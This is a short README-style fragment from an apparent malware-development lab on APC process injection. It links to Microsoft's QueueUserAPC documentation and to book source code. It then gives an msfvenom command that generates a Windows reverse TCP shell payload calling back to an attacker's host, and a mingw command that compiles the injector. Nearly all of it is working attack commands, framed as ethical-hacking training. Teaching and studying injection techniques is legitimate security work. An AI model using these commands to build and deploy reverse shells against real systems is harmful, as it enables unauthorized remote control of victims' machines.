### References
- [QueueUserAPC ](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-queueuserapc)
- [Original Source Code by @cocomelonc](https://github.com/PacktPublishing/Malware-Development-for-Ethical-Hackers/blob/main/chapter02/03-apc-injection/hack1.c)

---
Remember to generate the payload in `Kali`.
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<YOUR_IP_ADDR> LPORT=4444 -f c
```
# Step 1
1. Compile `hack1.c`
```bash
x86_64-w64-mingw32-gcc hack1.c -o hack1.exe -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

